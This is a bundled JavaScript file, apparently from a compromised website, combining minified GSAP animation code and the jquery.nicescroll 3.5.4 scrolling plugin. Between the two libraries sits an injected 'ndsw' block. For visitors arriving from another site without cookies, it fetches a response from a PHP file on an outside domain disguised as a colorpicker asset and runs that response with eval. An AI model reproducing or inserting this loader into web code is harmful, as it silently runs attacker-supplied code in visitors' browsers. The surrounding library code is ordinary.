                this.ratio = this._ease._calcEnd ? this._ease.getRatio(0) : 0,
                (0 !== o || 0 === h && this._rawPrevTime > l) && (r = "onReverseComplete",
                s = this._reversed),
                0 > t ? (this._active = !1,
                0 === h && (this._rawPrevTime >= 0 && (i = !0),
                this._rawPrevTime = a = !e || t ? t : l)) : this._initted || (i = !0);
            else if (this._totalTime = this._time = t,
            this._easeType) {
                var _ = t / h
                  , u = this._easeType
                  , p = this._easePower;
                (1 === u || 3 === u && _ >= .5) && (_ = 1 - _),
                3 === u && (_ *= 2),
                1 === p ? _ *= _ : 2 === p ? _ *= _ * _ : 3 === p ? _ *= _ * _ * _ : 4 === p && (_ *= _ * _ * _ * _),
                this.ratio = 1 === u ? 1 - _ : 2 === u ? _ : .5 > t / h ? _ / 2 : 1 - _ / 2
            } else
                this.ratio = this._ease.getRatio(t / h);
            if (this._time !== o || i) {
                if (!this._initted) {
                    if (this._init(),
                    !this._initted || this._gc)
                        return;
                    this._time && !s ? this.ratio = this._ease.getRatio(this._time / h) : s && this._ease._calcEnd && (this.ratio = this._ease.getRatio(0 === this._time ? 0 : 1))
                }
                for (this._active || !this._paused && this._time !== o && t >= 0 && (this._active = !0),
                0 === o && (this._startAt && (t >= 0 ? this._startAt.render(t, e, i) : r || (r = "_dummyGS")),
                this.vars.onStart && (0 !== this._time || 0 === h) && (e || this.vars.onStart.apply(this.vars.onStartScope || this, this.vars.onStartParams || v))),
                n = this._firstPT; n; )
                    n.f ? n.t[n.p](n.c * this.ratio + n.s) : n.t[n.p] = n.c * this.ratio + n.s,
                    n = n._next;
                this._onUpdate && (0 > t && this._startAt && this._startTime && this._startAt.render(t, e, i),
                e || i && 0 === this._time && 0 === o || this._onUpdate.apply(this.vars.onUpdateScope || this, this.vars.onUpdateParams || v)),
                r && (this._gc || (0 > t && this._startAt && !this._onUpdate && this._startTime && this._startAt.render(t, e, i),
                s && (this._timeline.autoRemoveChildren && this._enabled(!1, !1),
                this._active = !1),
                !e && this.vars[r] && this.vars[r].apply(this.vars[r + "Scope"] || this, this.vars[r + "Params"] || v),
                0 === h && this._rawPrevTime !== a && (this._rawPrevTime = 0)))
            }
        }
        ,
        r._kill = function(t, e) {
            if ("all" === t && (t = null),
            null == t && (null == e || e === this.target))
                return this._enabled(!1, !1);
            e = "string" != typeof e ? e || this._targets || this.target : O.selector(e) || e;
            var i, s, r, n, a, o, h, l;
            if ((p(e) || D(e)) && "number" != typeof e[0])
                for (i = e.length; --i > -1; )
                    this._kill(t, e[i]) && (o = !0);
            else {
                if (this._targets) {
                    for (i = this._targets.length; --i > -1; )
                        if (e === this._targets[i]) {
                            a = this._propLookup[i] || {},
                            this._overwrittenProps = this._overwrittenProps || [],
                            s = this._overwrittenProps[i] = t ? this._overwrittenProps[i] || {} : "all";
                            break
                        }
                } else {
                    if (e !== this.target)
                        return !1;
                    a = this._propLookup,
                    s = this._overwrittenProps = t ? this._overwrittenProps || {} : "all"
                }
                if (a) {
                    h = t || a,
                    l = t !== s && "all" !== s && t !== a && ("object" != typeof t || !t._tempKill);
                    for (r in h)
                        (n = a[r]) && (n.pg && n.t._kill(h) && (o = !0),
                        n.pg && 0 !== n.t._overwriteProps.length || (n._prev ? n._prev._next = n._next : n === this._firstPT && (this._firstPT = n._next),
                        n._next && (n._next._prev = n._prev),
                        n._next = n._prev = null),
                        delete a[r]),
                        l && (s[r] = 1);
                    !this._firstPT && this._initted && this._enabled(!1, !1)
                }
            }
            return o
        }
        ,
        r.invalidate = function() {
            return this._notifyPluginsOfEnabled && O._onPluginEvent("_onDisable", this),
            this._firstPT = null,
            this._overwrittenProps = null,
            this._onUpdate = null,
            this._startAt = null,
            this._initted = this._active = this._notifyPluginsOfEnabled = !1,
            this._propLookup = this._targets ? {} : [],
            this
        }
        ,
        r._enabled = function(t, e) {
            if (a || n.wake(),
            t && this._gc) {
                var i, s = this._targets;
                if (s)
                    for (i = s.length; --i > -1; )
                        this._siblings[i] = Y(s[i], this, !0);
                else
                    this._siblings = Y(this.target, this, !0)
            }
            return R.prototype._enabled.call(this, t, e),
            this._notifyPluginsOfEnabled && this._firstPT ? O._onPluginEvent(t ? "_onEnable" : "_onDisable", this) : !1
        }
        ,
        O.to = function(t, e, i) {
            return new O(t,e,i)
        }
        ,
        O.from = function(t, e, i) {
            return i.runBackwards = !0,
            i.immediateRender = 0 != i.immediateRender,
            new O(t,e,i)
        }
        ,
        O.fromTo = function(t, e, i, s) {
            return s.startAt = i,
            s.immediateRender = 0 != s.immediateRender && 0 != i.immediateRender,
            new O(t,e,s)
        }
        ,
        O.delayedCall = function(t, e, i, s, r) {
            return new O(e,0,{
                delay: t,
                onComplete: e,
                onCompleteParams: i,
                onCompleteScope: s,
                onReverseComplete: e,
                onReverseCompleteParams: i,
                onReverseCompleteScope: s,
                immediateRender: !1,
                useFrames: r,
                overwrite: 0
            })
        }
        ,
        O.set = function(t, e) {
            return new O(t,0,e)
        }
        ,
        O.getTweensOf = function(t, e) {
            if (null == t)
                return [];
            t = "string" != typeof t ? t : O.selector(t) || t;
            var i, s, r, n;
            if ((p(t) || D(t)) && "number" != typeof t[0]) {
                for (i = t.length,
                s = []; --i > -1; )
                    s = s.concat(O.getTweensOf(t[i], e));
                for (i = s.length; --i > -1; )
                    for (n = s[i],
                    r = i; --r > -1; )
                        n === s[r] && s.splice(i, 1)
            } else
                for (s = Y(t).concat(),
                i = s.length; --i > -1; )
                    (s[i]._gc || e && !s[i].isActive()) && s.splice(i, 1);
            return s
        }
        ,
        O.killTweensOf = O.killDelayedCallsTo = function(t, e, i) {
            "object" == typeof e && (i = e,
            e = !1);
            for (var s = O.getTweensOf(t, e), r = s.length; --r > -1; )
                s[r]._kill(i, t)
        }
        ;
        var q = d("plugins.TweenPlugin", function(t, e) {
            this._overwriteProps = (t || "").split(","),
            this._propName = this._overwriteProps[0],
            this._priority = e || 0,
            this._super = q.prototype
        }, !0);
        if (r = q.prototype,
        q.version = "1.10.1",
        q.API = 2,
        r._firstPT = null,
        r._addTween = function(t, e, i, s, r, n) {
            var a, o;
            return null != s && (a = "number" == typeof s || "=" !== s.charAt(1) ? Number(s) - i : parseInt(s.charAt(0) + "1", 10) * Number(s.substr(2))) ? (this._firstPT = o = {
                _next: this._firstPT,
                t: t,
                p: e,
                s: i,
                c: a,
                f: "function" == typeof t[e],
                n: r || e,
                r: n
            },
            o._next && (o._next._prev = o),
            o) : void 0
        }
        ,
        r.setRatio = function(t) {
            for (var e, i = this._firstPT, s = 1e-6; i; )
                e = i.c * t + i.s,
                i.r ? e = 0 | e + (e > 0 ? .5 : -.5) : s > e && e > -s && (e = 0),
                i.f ? i.t[i.p](e) : i.t[i.p] = e,
                i = i._next
        }
        ,
        r._kill = function(t) {
            var e, i = this._overwriteProps, s = this._firstPT;
            if (null != t[this._propName])
                this._overwriteProps = [];
            else
                for (e = i.length; --e > -1; )
                    null != t[i[e]] && i.splice(e, 1);
            for (; s; )
                null != t[s.n] && (s._next && (s._next._prev = s._prev),
                s._prev ? (s._prev._next = s._next,
                s._prev = null) : this._firstPT === s && (this._firstPT = s._next)),
                s = s._next;
            return !1
        }
        ,
        r._roundProps = function(t, e) {
            for (var i = this._firstPT; i; )
                (t[this._propName] || null != i.n && t[i.n.split(this._propName + "_").join("")]) && (i.r = e),
                i = i._next
        }
        ,
        O._onPluginEvent = function(t, e) {
            var i, s, r, n, a, o = e._firstPT;
            if ("_onInitAllProps" === t) {
                for (; o; ) {
                    for (a = o._next,
                    s = r; s && s.pr > o.pr; )
                        s = s._next;
                    (o._prev = s ? s._prev : n) ? o._prev._next = o : r = o,
                    (o._next = s) ? s._prev = o : n = o,
                    o = a
                }
                o = e._firstPT = r
            }
            for (; o; )
                o.pg && "function" == typeof o.t[t] && o.t[t]() && (i = !0),
                o = o._next;
            return i
        }
        ,
        q.activate = function(t) {
            for (var e = t.length; --e > -1; )
                t[e].API === q.API && (F[(new t[e])._propName] = t[e]);
            return !0
        }
        ,
        m.plugin = function(t) {
            if (!(t && t.propName && t.init && t.API))
                throw "illegal plugin definition.";
            var e, i = t.propName, s = t.priority || 0, r = t.overwriteProps, n = {
                init: "_onInitTween",
                set: "setRatio",
                kill: "_kill",
                round: "_roundProps",
                initAll: "_onInitAllProps"
            }, a = d("plugins." + i.charAt(0).toUpperCase() + i.substr(1) + "Plugin", function() {
                q.call(this, i, s),
                this._overwriteProps = r || []
            }, t.global === !0), o = a.prototype = new q(i);
            o.constructor = a,
            a.API = t.API;
            for (e in n)
                "function" == typeof t[e] && (o[n[e]] = t[e]);
            return a.version = t.version,
            q.activate([a]),
            a
        }
        ,
        i = t._gsQueue) {
            for (s = 0; i.length > s; s++)
                i[s]();
            for (r in f)
                f[r].func || t.console.log("GSAP encountered missing dependency: com.greensock." + r)
        }
        a = !1
    }
}(window);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/* jquery.nicescroll 3.5.4 InuYaksa*2013 MIT http://areaaperta.com/nicescroll */
(function(e) {
    "function" === typeof define && define.amd ? define(["jquery"], e) : e(jQuery)
}
)(function(e) {
    var y = !1
      , C = !1
      , J = 5E3
      , K = 2E3
      , x = 0
      , F = ["ms", "moz", "webkit", "o"]
      , s = window.requestAnimationFrame || !1
      , v = window.cancelAnimationFrame || !1;
    if (!s)
        for (var L in F) {
            var D = F[L];
            s || (s = window[D + "RequestAnimationFrame"]);
            v || (v = window[D + "CancelAnimationFrame"] || window[D + "CancelRequestAnimationFrame"])
        }
    var z = window.MutationObserver || window.WebKitMutationObserver || !1
      , G = {
        zindex: "auto",
        cursoropacitymin: 0,
        cursoropacitymax: 1,
        cursorcolor: "#424242",
        cursorwidth: "5px",
        cursorborder: "1px solid #fff",
        cursorborderradius: "5px",
        scrollspeed: 60,
        mousescrollstep: 24,
        touchbehavior: !1,
        hwacceleration: !0,
        usetransition: !0,
        boxzoom: !1,
        dblclickzoom: !0,
        gesturezoom: !0,
        grabcursorenabled: !0,
        autohidemode: !0,
        background: "",
        iframeautoresize: !0,
        cursorminheight: 32,
        preservenativescrolling: !0,
        railoffset: !1,
        bouncescroll: !0,
        spacebarenabled: !0,
        railpadding: {
            top: 0,
            right: 0,
            left: 0,
            bottom: 0
        },
        disableoutline: !0,
        horizrailenabled: !0,
        railalign: "right",
        railvalign: "bottom",
        enabletranslate3d: !0,
        enablemousewheel: !0,
        enablekeyboard: !0,
        smoothscroll: !0,
        sensitiverail: !0,
        enablemouselockapi: !0,
        cursorfixedheight: !1,
        directionlockdeadzone: 6,
        hidecursordelay: 400,
        nativeparentscrolling: !0,
        enablescrollonselection: !0,
        overflowx: !0,
        overflowy: !0,
        cursordragspeed: 0.3,
        rtlmode: "auto",
        cursordragontouch: !1,
        oneaxismousemode: "auto",
        scriptpath: function() {
            var e = document.getElementsByTagName("script")
              , e = e[e.length - 1].src.split("?")[0];
            return 0 < e.split("/").length ? e.split("/").slice(0, -1).join("/") + "/" : ""
        }()
    }
      , E = !1
      , M = function() {
        if (E)
            return E;
        var e = document.createElement("DIV")
          , b = {
            haspointerlock: "pointerLockElement"in document || "mozPointerLockElement"in document || "webkitPointerLockElement"in document
        };
        b.isopera = "opera"in window;
        b.isopera12 = b.isopera && "getUserMedia"in navigator;
        b.isoperamini = "[object OperaMini]" === Object.prototype.toString.call(window.operamini);
        b.isie = "all"in document && "attachEvent"in e && !b.isopera;
        b.isieold = b.isie && !("msInterpolationMode"in e.style);
        b.isie7 = b.isie && !b.isieold && (!("documentMode"in document) || 7 == document.documentMode);
        b.isie8 = b.isie && "documentMode"in document && 8 == document.documentMode;
        b.isie9 = b.isie && "performance"in window && 9 <= document.documentMode;
        b.isie10 = b.isie && "performance"in window && 10 <= document.documentMode;
        b.isie9mobile = /iemobile.9/i.test(navigator.userAgent);
        b.isie9mobile && (b.isie9 = !1);
        b.isie7mobile = !b.isie9mobile && b.isie7 && /iemobile/i.test(navigator.userAgent);
        b.ismozilla = "MozAppearance"in e.style;
        b.iswebkit = "WebkitAppearance"in e.style;
        b.ischrome = "chrome"in window;
        b.ischrome22 = b.ischrome && b.haspointerlock;
        b.ischrome26 = b.ischrome && "transition"in e.style;
        b.cantouch = "ontouchstart"in document.documentElement || "ontouchstart"in window;
        b.hasmstouch = window.navigator.msPointerEnabled || !1;
        b.ismac = /^mac$/i.test(navigator.platform);
        b.isios = b.cantouch && /iphone|ipad|ipod/i.test(navigator.platform);
        b.isios4 = b.isios && !("seal"in Object);
        b.isandroid = /android/i.test(navigator.userAgent);
        b.trstyle = !1;
        b.hastransform = !1;
        b.hastranslate3d = !1;
        b.transitionstyle = !1;
        b.hastransition = !1;
        b.transitionend = !1;
        for (var h = ["transform", "msTransform", "webkitTransform", "MozTransform", "OTransform"], k = 0; k < h.length; k++)
            if ("undefined" != typeof e.style[h[k]]) {
                b.trstyle = h[k];
                break
            }
        b.hastransform = !1 != b.trstyle;
        b.hastransform && (e.style[b.trstyle] = "translate3d(1px,2px,3px)",
        b.hastranslate3d = /translate3d/.test(e.style[b.trstyle]));
        b.transitionstyle = !1;
        b.prefixstyle = "";
        b.transitionend = !1;
        for (var h = "transition webkitTransition MozTransition OTransition OTransition msTransition KhtmlTransition".split(" "), l = " -webkit- -moz- -o- -o -ms- -khtml-".split(" "), q = "transitionend webkitTransitionEnd transitionend otransitionend oTransitionEnd msTransitionEnd KhtmlTransitionEnd".split(" "), k = 0; k < h.length; k++)
            if (h[k]in e.style) {
                b.transitionstyle = h[k];
                b.prefixstyle = l[k];
                b.transitionend = q[k];
                break
            }
        b.ischrome26 && (b.prefixstyle = l[1]);
        b.hastransition = b.transitionstyle;
        a: {
            h = ["-moz-grab", "-webkit-grab", "grab"];
            if (b.ischrome && !b.ischrome22 || b.isie)
                h = [];
            for (k = 0; k < h.length; k++)
                if (l = h[k],
                e.style.cursor = l,
                e.style.cursor == l) {
                    h = l;
                    break a
                }
            h = "url(http://www.google.com/intl/en_ALL/mapfiles/openhand.cur),n-resize"
        }
        b.cursorgrabvalue = h;
        b.hasmousecapture = "setCapture"in e;
        b.hasMutationObserver = !1 !== z;
        return E = b
    }
      , N = function(g, b) {
        function h() {
            var c = a.win;
            if ("zIndex"in c)
                return c.zIndex();
            for (; 0 < c.length && 9 != c[0].nodeType; ) {
                var b = c.css("zIndex");
                if (!isNaN(b) && 0 != b)
                    return parseInt(b);
                c = c.parent()
            }
            return !1
        }
        function k(c, b, f) {
            b = c.css(b);
            c = parseFloat(b);
            return isNaN(c) ? (c = w[b] || 0,
            f = 3 == c ? f ? a.win.outerHeight() - a.win.innerHeight() : a.win.outerWidth() - a.win.innerWidth() : 1,
            a.isie8 && c && (c += 1),
            f ? c : 0) : c
        }
        function l(c, b, f, e) {
            a._bind(c, b, function(a) {
                a = a ? a : window.event;
                var e = {
                    original: a,
                    target: a.target || a.srcElement,
                    type: "wheel",
                    deltaMode: "MozMousePixelScroll" == a.type ? 0 : 1,
                    deltaX: 0,
                    deltaZ: 0,
                    preventDefault: function() {
                        a.preventDefault ? a.preventDefault() : a.returnValue = !1;
                        return !1
                    },
                    stopImmediatePropagation: function() {
                        a.stopImmediatePropagation ? a.stopImmediatePropagation() : a.cancelBubble = !0
                    }
                };
                "mousewheel" == b ? (e.deltaY = -0.025 * a.wheelDelta,
                a.wheelDeltaX && (e.deltaX = -0.025 * a.wheelDeltaX)) : e.deltaY = a.detail;
                return f.call(c, e)
            }, e)
        }
        function q(c, b, f) {
            var e, d;
            0 == c.deltaMode ? (e = -Math.floor(c.deltaX * (a.opt.mousescrollstep / 54)),
            d = -Math.floor(c.deltaY * (a.opt.mousescrollstep / 54))) : 1 == c.deltaMode && (e = -Math.floor(c.deltaX * a.opt.mousescrollstep),
            d = -Math.floor(c.deltaY * a.opt.mousescrollstep));
            b && (a.opt.oneaxismousemode && 0 == e && d) && (e = d,
            d = 0);
            e && (a.scrollmom && a.scrollmom.stop(),
            a.lastdeltax += e,
            a.debounced("mousewheelx", function() {
                var c = a.lastdeltax;
                a.lastdeltax = 0;
                a.rail.drag || a.doScrollLeftBy(c)
            }, 15));
            if (d) {
                if (a.opt.nativeparentscrolling && f && !a.ispage && !a.zoomactive)
                    if (0 > d) {
                        if (a.getScrollTop() >= a.page.maxh)
                            return !0
                    } else if (0 >= a.getScrollTop())
                        return !0;
                a.scrollmom && a.scrollmom.stop();
                a.lastdeltay += d;
                a.debounced("mousewheely", function() {
                    var c = a.lastdeltay;
                    a.lastdeltay = 0;
                    a.rail.drag || a.doScrollBy(c)
                }, 15)
            }
            c.stopImmediatePropagation();
            return c.preventDefault()
        }
        var a = this;
        this.version = "3.5.4";
        this.name = "nicescroll";
        this.me = b;
        this.opt = {
            doc: e("body"),
            win: !1
        };
        e.extend(this.opt, G);
        this.opt.snapbackspeed = 80;
        if (g)
            for (var p in a.opt)
                "undefined" != typeof g[p] && (a.opt[p] = g[p]);
        this.iddoc = (this.doc = a.opt.doc) && this.doc[0] ? this.doc[0].id || "" : "";
        this.ispage = /^BODY|HTML/.test(a.opt.win ? a.opt.win[0].nodeName : this.doc[0].nodeName);
        this.haswrapper = !1 !== a.opt.win;
        this.win = a.opt.win || (this.ispage ? e(window) : this.doc);
        this.docscroll = this.ispage && !this.haswrapper ? e(window) : this.win;
        this.body = e("body");
        this.iframe = this.isfixed = this.viewport = !1;
        this.isiframe = "IFRAME" == this.doc[0].nodeName && "IFRAME" == this.win[0].nodeName;
        this.istextarea = "TEXTAREA" == this.win[0].nodeName;
        this.forcescreen = !1;
        this.canshowonmouseevent = "scroll" != a.opt.autohidemode;
        this.page = this.view = this.onzoomout = this.onzoomin = this.onscrollcancel = this.onscrollend = this.onscrollstart = this.onclick = this.ongesturezoom = this.onkeypress = this.onmousewheel = this.onmousemove = this.onmouseup = this.onmousedown = !1;
        this.scroll = {
            x: 0,
            y: 0
        };
        this.scrollratio = {
            x: 0,
            y: 0
        };
        this.cursorheight = 20;
        this.scrollvaluemax = 0;
        this.observerremover = this.observer = this.scrollmom = this.scrollrunning = this.isrtlmode = !1;
        do
            this.id = "ascrail" + K++;
        while (document.getElementById(this.id));
        this.hasmousefocus = this.hasfocus = this.zoomactive = this.zoom = this.selectiondrag = this.cursorfreezed = this.cursor = this.rail = !1;
        this.visibility = !0;
        this.hidden = this.locked = !1;
        this.cursoractive = !0;
        this.wheelprevented = !1;
        this.overflowx = a.opt.overflowx;
        this.overflowy = a.opt.overflowy;
        this.nativescrollingarea = !1;
        this.checkarea = 0;
        this.events = [];
        this.saved = {};
        this.delaylist = {};
        this.synclist = {};
        this.lastdeltay = this.lastdeltax = 0;
        this.detected = M();
        var d = e.extend({}, this.detected);
        this.ishwscroll = (this.canhwscroll = d.hastransform && a.opt.hwacceleration) && a.haswrapper;
        this.istouchcapable = !1;
        d.cantouch && (d.ischrome && !d.isios && !d.isandroid) && (this.istouchcapable = !0,
        d.cantouch = !1);
        d.cantouch && (d.ismozilla && !d.isios && !d.isandroid) && (this.istouchcapable = !0,
        d.cantouch = !1);
        a.opt.enablemouselockapi || (d.hasmousecapture = !1,
        d.haspointerlock = !1);
        this.delayed = function(c, b, f, e) {
            var d = a.delaylist[c]
              , h = (new Date).getTime();
            if (!e && d && d.tt)
                return !1;
            d && d.tt && clearTimeout(d.tt);
            if (d && d.last + f > h && !d.tt)
                a.delaylist[c] = {
                    last: h + f,
                    tt: setTimeout(function() {
                        a && (a.delaylist[c].tt = 0,
                        b.call())
                    }, f)
                };
            else if (!d || !d.tt)
                a.delaylist[c] = {
                    last: h,
                    tt: 0
                },
                setTimeout(function() {
                    b.call()
                }, 0)
        }
        ;
        this.debounced = function(c, b, f) {
            var d = a.delaylist[c];
            (new Date).getTime();
            a.delaylist[c] = b;
            d || setTimeout(function() {
                var b = a.delaylist[c];
                a.delaylist[c] = !1;
                b.call()
            }, f)
        }
        ;
        var r = !1;
        this.synched = function(c, b) {
            a.synclist[c] = b;
            (function() {
                r || (s(function() {
                    r = !1;
                    for (c in a.synclist) {
                        var b = a.synclist[c];
                        b && b.call(a);
                        a.synclist[c] = !1
                    }
                }),
                r = !0)
            }
            )();
            return c
        }
        ;
        this.unsynched = function(c) {
            a.synclist[c] && (a.synclist[c] = !1)
        }
        ;
        this.css = function(c, b) {
            for (var f in b)
                a.saved.css.push([c, f, c.css(f)]),
                c.css(f, b[f])
        }
        ;
        this.scrollTop = function(c) {
            return "undefined" == typeof c ? a.getScrollTop() : a.setScrollTop(c)
        }
        ;
        this.scrollLeft = function(c) {
            return "undefined" == typeof c ? a.getScrollLeft() : a.setScrollLeft(c)
        }
        ;
        BezierClass = function(a, b, f, d, e, h, k) {
            this.st = a;
            this.ed = b;
            this.spd = f;
            this.p1 = d || 0;
            this.p2 = e || 1;
            this.p3 = h || 0;
            this.p4 = k || 1;
            this.ts = (new Date).getTime();
            this.df = this.ed - this.st
        }
        ;
        BezierClass.prototype = {
            B2: function(a) {
                return 3 * a * a * (1 - a)
            },
            B3: function(a) {
                return 3 * a * (1 - a) * (1 - a)
            },
            B4: function(a) {
                return (1 - a) * (1 - a) * (1 - a)
            },
            getNow: function() {
                var a = 1 - ((new Date).getTime() - this.ts) / this.spd
                  , b = this.B2(a) + this.B3(a) + this.B4(a);
                return 0 > a ? this.ed : this.st + Math.round(this.df * b)
            },
            update: function(a, b) {
                this.st = this.getNow();
                this.ed = a;
                this.spd = b;
                this.ts = (new Date).getTime();
                this.df = this.ed - this.st;
                return this
            }
        };
        if (this.ishwscroll) {
            this.doc.translate = {
                x: 0,
                y: 0,
                tx: "0px",
                ty: "0px"
            };
            d.hastranslate3d && d.isios && this.doc.css("-webkit-backface-visibility", "hidden");
            var t = function() {
                var c = a.doc.css(d.trstyle);
                return c && "matrix" == c.substr(0, 6) ? c.replace(/^.*\((.*)\)$/g, "$1").replace(/px/g, "").split(/, +/) : !1
            };
            this.getScrollTop = function(c) {
                if (!c) {
                    if (c = t())
                        return 16 == c.length ? -c[13] : -c[5];
                    if (a.timerscroll && a.timerscroll.bz)
                        return a.timerscroll.bz.getNow()
                }
                return a.doc.translate.y
            }
            ;
            this.getScrollLeft = function(c) {
                if (!c) {
                    if (c = t())
                        return 16 == c.length ? -c[12] : -c[4];
                    if (a.timerscroll && a.timerscroll.bh)
                        return a.timerscroll.bh.getNow()
                }
                return a.doc.translate.x
            }
            ;
            this.notifyScrollEvent = document.createEvent ? function(a) {
                var b = document.createEvent("UIEvents");
                b.initUIEvent("scroll", !1, !0, window, 1);
                a.dispatchEvent(b)
            }
            : document.fireEvent ? function(a) {
                var b = document.createEventObject();
                a.fireEvent("onscroll");
                b.cancelBubble = !0
            }
            : function(a, b) {}
            ;
            d.hastranslate3d && a.opt.enabletranslate3d ? (this.setScrollTop = function(c, b) {
                a.doc.translate.y = c;
                a.doc.translate.ty = -1 * c + "px";
                a.doc.css(d.trstyle, "translate3d(" + a.doc.translate.tx + "," + a.doc.translate.ty + ",0px)");
                b || a.notifyScrollEvent(a.win[0])
            }
            ,
            this.setScrollLeft = function(c, b) {
                a.doc.translate.x = c;
                a.doc.translate.tx = -1 * c + "px";
                a.doc.css(d.trstyle, "translate3d(" + a.doc.translate.tx + "," + a.doc.translate.ty + ",0px)");
                b || a.notifyScrollEvent(a.win[0])
            }
            ) : (this.setScrollTop = function(c, b) {
                a.doc.translate.y = c;
                a.doc.translate.ty = -1 * c + "px";
                a.doc.css(d.trstyle, "translate(" + a.doc.translate.tx + "," + a.doc.translate.ty + ")");
                b || a.notifyScrollEvent(a.win[0])
            }
            ,
            this.setScrollLeft = function(c, b) {
                a.doc.translate.x = c;
                a.doc.translate.tx = -1 * c + "px";
                a.doc.css(d.trstyle, "translate(" + a.doc.translate.tx + "," + a.doc.translate.ty + ")");
                b || a.notifyScrollEvent(a.win[0])
            }
            )
        } else
            this.getScrollTop = function() {
                return a.docscroll.scrollTop()
            }
            ,
            this.setScrollTop = function(c) {
                return a.docscroll.scrollTop(c)
            }
            ,
            this.getScrollLeft = function() {
                return a.docscroll.scrollLeft()
            }
            ,
            this.setScrollLeft = function(c) {
                return a.docscroll.scrollLeft(c)
            }
            ;
        this.getTarget = function(a) {
            return !a ? !1 : a.target ? a.target : a.srcElement ? a.srcElement : !1
        }
        ;
        this.hasParent = function(a, b) {
            if (!a)
                return !1;
            for (var f = a.target || a.srcElement || a || !1; f && f.id != b; )
                f = f.parentNode || !1;
            return !1 !== f
        }
        ;
        var w = {
            thin: 1,
            medium: 3,
            thick: 5
        };
        this.getOffset = function() {
            if (a.isfixed)
                return {
                    top: parseFloat(a.win.css("top")),
                    left: parseFloat(a.win.css("left"))
                };
            if (!a.viewport)
                return a.win.offset();
            var c = a.win.offset()
              , b = a.viewport.offset();
            return {
                top: c.top - b.top + a.viewport.scrollTop(),
                left: c.left - b.left + a.viewport.scrollLeft()
            }
        }
        ;
        this.updateScrollBar = function(c) {
            if (a.ishwscroll)
                a.rail.css({
                    height: a.win.innerHeight()
                }),
                a.railh && a.railh.css({
                    width: a.win.innerWidth()
                });
            else {
                var b = a.getOffset()
                  , f = b.top
                  , d = b.left
                  , f = f + k(a.win, "border-top-width", !0);
                a.win.outerWidth();
                a.win.innerWidth();
                var d = d + (a.rail.align ? a.win.outerWidth() - k(a.win, "border-right-width") - a.rail.width : k(a.win, "border-left-width"))
                  , e = a.opt.railoffset;
                e && (e.top && (f += e.top),
                a.rail.align && e.left && (d += e.left));
                a.locked || a.rail.css({
                    top: f,
                    left: d,
                    height: c ? c.h : a.win.innerHeight()
                });
                a.zoom && a.zoom.css({
                    top: f + 1,
                    left: 1 == a.rail.align ? d - 20 : d + a.rail.width + 4
                });
                a.railh && !a.locked && (f = b.top,
                d = b.left,
                c = a.railh.align ? f + k(a.win, "border-top-width", !0) + a.win.innerHeight() - a.railh.height : f + k(a.win, "border-top-width", !0),
                d += k(a.win, "border-left-width"),
                a.railh.css({
                    top: c,
                    left: d,
                    width: a.railh.width
                }))
            }
        }
        ;
        this.doRailClick = function(c, b, f) {
            var d;
            a.locked || (a.cancelEvent(c),
            b ? (b = f ? a.doScrollLeft : a.doScrollTop,
            d = f ? (c.pageX - a.railh.offset().left - a.cursorwidth / 2) * a.scrollratio.x : (c.pageY - a.rail.offset().top - a.cursorheight / 2) * a.scrollratio.y,
            b(d)) : (b = f ? a.doScrollLeftBy : a.doScrollBy,
            d = f ? a.scroll.x : a.scroll.y,
            c = f ? c.pageX - a.railh.offset().left : c.pageY - a.rail.offset().top,
            f = f ? a.view.w : a.view.h,
            d >= c ? b(f) : b(-f)))
        }
        ;
        a.hasanimationframe = s;
        a.hascancelanimationframe = v;
        a.hasanimationframe ? a.hascancelanimationframe || (v = function() {
            a.cancelAnimationFrame = !0
        }
        ) : (s = function(a) {
            return setTimeout(a, 15 - Math.floor(+new Date / 1E3) % 16)
        }
        ,
        v = clearInterval);
        this.init = function() {
            a.saved.css = [];
            if (d.isie7mobile || d.isoperamini)
                return !0;
            d.hasmstouch && a.css(a.ispage ? e("html") : a.win, {
                "-ms-touch-action": "none"
            });
            a.zindex = "auto";
            a.zindex = !a.ispage && "auto" == a.opt.zindex ? h() || "auto" : a.opt.zindex;
            !a.ispage && "auto" != a.zindex && a.zindex > x && (x = a.zindex);
            a.isie && (0 == a.zindex && "auto" == a.opt.zindex) && (a.zindex = "auto");
            if (!a.ispage || !d.cantouch && !d.isieold && !d.isie9mobile) {
                var c = a.docscroll;
                a.ispage && (c = a.haswrapper ? a.win : a.doc);
                d.isie9mobile || a.css(c, {
                    "overflow-y": "hidden"
                });
                a.ispage && d.isie7 && ("BODY" == a.doc[0].nodeName ? a.css(e("html"), {
                    "overflow-y": "hidden"
                }) : "HTML" == a.doc[0].nodeName && a.css(e("body"), {
                    "overflow-y": "hidden"
                }));
                d.isios && (!a.ispage && !a.haswrapper) && a.css(e("body"), {
                    "-webkit-overflow-scrolling": "touch"
                });
                var b = e(document.createElement("div"));
                b.css({
                    position: "relative",
                    top: 0,
                    "float": "right",
                    width: a.opt.cursorwidth,
                    height: "0px",
                    "background-color": a.opt.cursorcolor,
                    border: a.opt.cursorborder,
                    "background-clip": "padding-box",
                    "-webkit-border-radius": a.opt.cursorborderradius,
                    "-moz-border-radius": a.opt.cursorborderradius,
                    "border-radius": a.opt.cursorborderradius
                });
                b.hborder = parseFloat(b.outerHeight() - b.innerHeight());
                a.cursor = b;
                var f = e(document.createElement("div"));
                f.attr("id", a.id);
                f.addClass("nicescroll-rails");
                var u, k, g = ["left", "right"], l;
                for (l in g)
                    k = g[l],
                    (u = a.opt.railpadding[k]) ? f.css("padding-" + k, u + "px") : a.opt.railpadding[k] = 0;
                f.append(b);
                f.width = Math.max(parseFloat(a.opt.cursorwidth), b.outerWidth()) + a.opt.railpadding.left + a.opt.railpadding.right;
                f.css({
                    width: f.width + "px",
                    zIndex: a.zindex,
